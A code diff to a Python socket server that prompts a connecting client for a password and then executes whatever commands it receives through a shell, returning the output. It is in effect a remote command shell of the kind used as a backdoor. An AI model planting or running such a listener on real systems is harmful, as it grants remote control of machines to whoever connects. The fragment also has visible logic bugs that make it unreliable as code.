@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 
-def lookForConnection(server):
+def lookForConnection(server, passwords_match):
     server.listen(1)
     client, client_addr = server.accept()
     client.send(("Input password for client: ").encode())
@@ -24,7 +24,7 @@ server = socket.socket()
 server.bind((HOST, PORT))
 print('Server Started')
 print('Listening For Client Connection')
-lookForConnection(server)
+passwords_match = lookForConnection(server, passwords_match)
 
 while passwords_match == True:
     print("[-] Awaiting commands...")
@@ -33,7 +33,7 @@ while passwords_match == True:
     if command == "exit":
         passwords_match == False
         client.close()
-        lookForConnection(server)
+        passwords_match = lookForConnection(server, passwords_match)
     else:
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
